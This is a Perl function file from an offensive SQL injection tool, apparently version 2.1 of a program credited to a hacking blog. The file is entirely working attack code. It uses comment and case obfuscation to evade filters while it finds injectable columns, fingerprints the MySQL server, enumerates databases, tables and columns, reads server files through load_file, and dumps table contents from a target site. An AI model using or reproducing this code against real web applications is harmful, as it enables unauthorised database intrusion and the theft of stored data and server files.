#!/usr/local/bin/perl

#-----------------------------------------------------------------------------------------#
# Inject that bitch VOİXSEC.BLOGSPOT.COM
# Code V2.1
# Function file: Get about by web, Get tables&columns, Dump data (Regular injection)
#-----------------------------------------------------------------------------------------#

sub regular_MySQL_columns()
{
	$columns = 1;
	$fcolumn = "0x5072307859";
	$group_b = "";
	
	$group_b  = "+AnD+/**/1=2+/**/UNION/**/SELECT+".$fcolumn;
	$about    = &ghs($target.$group_b.$comment);
	
	while(!($about =~ /Pr0xY/))
	{
		if($columns > $max_columns)
		{
			print "\n\nUnable to locate some existing columns!\nTry blind injection(y/n)? ";
			chomp($tryBlind = <STDIN>);
			
			if($tryBlind eq 'y')
			{
				print "\n\n";
				&blind_search();
				exit;
			}
			else
			{
				exit;
			}
		}
		
		&generalPrint("Find No.of.columns\nNo.of.columns(".$columns.")",1);
				
		$columns++;
		$group_b .= "+/**/+,/**/".$fcolumn;
		$about   = &ghs($target.$group_b.$comment);
	}	


	return $columns;
}

sub regular_MySQL_wherePrint()
{	
	$no_of  = $columns;
	$concat = '0x507230785968656c706572';
	
	for($j = 1; $j <= $no_of; $j++)
	{
		&generalPrint("Find column to print\nColumn to print(".$j.")",1);
		$about  = &ghs($target."+AnD+1=0+/**/Union+/**/Select+/**/".&regular_MySQL_columnPrint($no_of,$j,$concat).$comment);	
		
		if($about =~ /Pr0xYhelper/){
			return $j;
		}
	}
	return 0;
}

sub regular_MySQL_columnPrint()
{
	$columnN = $_[0];
	$place2p = $_[1];
	$replace = $_[2];
	$group_b = "";
	
	for($i = 1; $i <= $columnN; $i++)
	{
		$group_b = ($i != 1)? $group_b.",+/**/" : $group_b;
		$group_b = ($i == $place2p)? $group_b.$replace : $group_b.$i;
	}
	return $group_b;
}

sub regular_MySQL_loadFile()
{	
	$concat = "UNHEX(HEX(CONCAT(0x3b7068656c313b,load_file(".&ascii2hex($_[0])."),0x3b7068656c313b)))";
	$about  = &ghs($target."+AnD+1=0+/**/Union+/**/Select+/**/".&regular_MySQL_columnPrint($columns,$cop,$concat).$comment);

	return ($about =~ m/\;phel1\;([\r\n\s\w\d\W\D\S]+)\;phel1\;/)?$1:"0x50723078592048656c706572";
}

sub regular_MySQL_aboutServer()
{
	&generalPrint("Get server about, please wait...", 1);
	
	$concat = "UNHEX(HEX(CONCAT(0x3b7068656c313b,user(),0x3b7068656c313b,database(),0x3b7068656c313b,\@\@version,0x3b7068656c313b)))";
	$about  = &ghs($target."+AnD+1=0+/**/Union+/**/Select+/**/".&regular_MySQL_columnPrint($columns,$cop,$concat).$comment);
	@server_about = ();

	if($about =~ /\;phel1\;([\w\d\_\-\@\.]+)\;phel1\;([\w\d\_\-\@\.]+)\;phel1\;([\w\d\_\-\@\.]+)\;phel1\;/)
	{
		@server_about = ($1,$2,$3);
		return @server_about;
	}
}

sub regular_MySQL_databasesN()
{
	$concat = "UNHEX(HEX(CONCAT(0x3b7068656c313b,Count(schema_name),0x3b7068656c313b)))";
	$about  = &ghs($target."+AnD+1=0+/**/Union+/**/Select+/**/".&regular_MySQL_columnPrint($columns,$cop,$concat)." from information_schema.schemata".$comment);
	
	return ($about =~ /\;phel1\;(\d+)\;phel1\;/)?$1:0;
}

sub regular_MySQL_databases()
{
	$limited = $db_num;
	
	$concat = "UNHEX(HEX(CONCAT(0x3b7068656c313b,schema_name,0x3b7068656c313b)))";
	$about  = &ghs($target."+AnD+1=0+/**/Union+/**/Select+/**/".&regular_MySQL_columnPrint($columns,$cop,$concat)."+/**//**/+frOm+/**/information_schema.schemata+LiMiT++".$limited.",1".$comment);

	
	if($about =~ /\;phel1\;(\S+)\;phel1\;/)
	{
		return $1;
	}
	else
	{
		return "";
	}
	
}

sub regular_MySQL_tables_short()
{
	$concat = "UNHEX(HEX(CONCAT(0x3b7068656c313b,count(".$_[0]."),0x3b7068656c313b)))";
			
	if($_[2] eq "")
	{
		$about  = &ghs($target."+AnD+1=0+/**/Union+/**/Select+/**/".&regular_MySQL_columnPrint($columns,$cop,$concat)." frOm information_schema.".$_[1].$comment);
	}
	else
	{
		$about  = &ghs($target."+AnD+1=0+/**/Union+/**/Select+/**/".&regular_MySQL_columnPrint($columns,$cop,$concat)." frOm information_schema.".$_[1]."+/**/Where+/**/".$_[2]."=".$hex_name.$comment);
	}
	
	if($about =~ /\;phel1\;(\d+)\;phel1\;/)
	{
		if($_[1] eq "columns")
		{
			$total_co = $1;
		}
		$query = "CONCAT(0x3b7068656c313b,";
		
		if($1 < 15)
		{
			$query .= "(SELECT GROUP_CONCAT(".$_[0].",0x3a)FROM(SELECT ".$_[0]." from information_schema.".$_[1];
			
			if(!($_[2] eq ""))
			{
				$query .= "  WHERE ".$_[2]."=".$hex_name." LIMIT 0,".$1;
			}
			else
			{
				$query .= " LIMIT 0,".$1;
			}
			$query .= ") as a)";
		}
		else
		{			
			for($i = 0, $s = 0; $i <= ($1/15); $i++,$s+=15)
			{
				if($i != 0)
				{
					$query .= ",";
				}
				
				$query .= "(SELECT GROUP_CONCAT(".$_[0].",0x3a)FROM(SELECT ".$_[0]." from information_schema.".$_[1];
				
				if(!($_[2] eq ""))
				{
					$query .= "/**/WHERE ".$_[2]."=".$hex_name."/**/LIMIT ";
					
					if(($s+15)>$1)
					{
						$limit  = ($1-15);
						$query .= ($s).",".$limit;
					}
					else
					{
						$query .= $s.",15";
					}
					
					$query .= ") as a)";
				}	
			}
		}
		
		$query .= ",0x3b7068656c313b)";		
		$about  = &ghs($target."+AnD+1=0+/**/Union+/**/Select+/**/".&regular_MySQL_columnPrint($columns,$cop,$query).$comment);
								
		if($about =~ m/\;phel1\;(.+[\:\,]+)\;phel1\;/)
		{
			$tables_dumpted = $1;
			@tables_old = split(/:,/, $tables_dumpted);
			@tables_new = ();
			$tables = "";
			
			for($i = 0; $i < @tables_old; $i++)
			{
				$tables_old[$i] =~ s/([\w\d\_\-]+)((\:|\,)+)/$1/g;
				$tables_old[$i] =~ s/(.+)[\:\,]/$1/g;
				$tables_old[$i] =~ s/(.+)(\;phel1\;.+\;phel1\;)/$1/g;
				
				if(!(in_array(\@tables_new,$tables_old[$i])))
				{
					$tables_new[@tables_new] = $tables_old[$i];
					$tables .= "   *".$tables_old[$i]."\n";
				}
				
			}

			$shor_way = 1;
			return "\n".$tables;
		}
		else
		{
			return "";
		}
	}
	
	return "";
}

sub regular_MySQL_abo()
{
	$limited = $_[0];
	$about  = &ghs($target."+AnD+1=0+/**/Union+/**/Select+/**/".&regular_MySQL_columnPrint($columns,$cop,$concat)."+/**/+from information_schema.".$_[1]."+/**/Where+/**/".$_[2]."=".$hex_name."+/**/LiMiT++".$limited.",1".$comment);
		
	if($about =~ /\;phel1\;(\S+)\;phel1\;/)
	{
		return $1;
	}
	return "";
}

sub regular_MySQL_dumpData()
{
	$limited = $dump_num;
		
	$concat = "UNHEX(HEX(CONCAT(0x3b7068656c313b,".$dump_concat.",0x3b7068656c313b)))";
	
	if(!($where_condition eq ""))
	{
		$about  = &ghs($target."+AnD+1=0+/**/Union+/**/Select+/**/".&regular_MySQL_columnPrint($columns,$cop,$concat)."+/**/From+/**/".$table_injection."+/**/".$where_condition."+++/**/+LiMiT++".$limited.",1".$comment);
	}
	else
	{
		$about  = &ghs($target."+AnD+1=0+/**/Union+/**/Select+/**/".&regular_MySQL_columnPrint($columns,$cop,$concat)."+/**/From+/**/".$table_injection."+/**/LiMiT++".$limited.",1".$comment);
	}
	
	if($about =~ /\;phel1\;(.+)\;phel1\;/)
	{
		$dumpted = $1;
		
		@dumpted_old = split(/;/, $dumpted);
		$result      = "";
		
		for($i = 0; $i < @dumps; $i++)
		{
			$result .= $dumps[$i]." ".$dumpted_old[$i]."\n";
		}
		
		return $result;
	}
}

return 1;
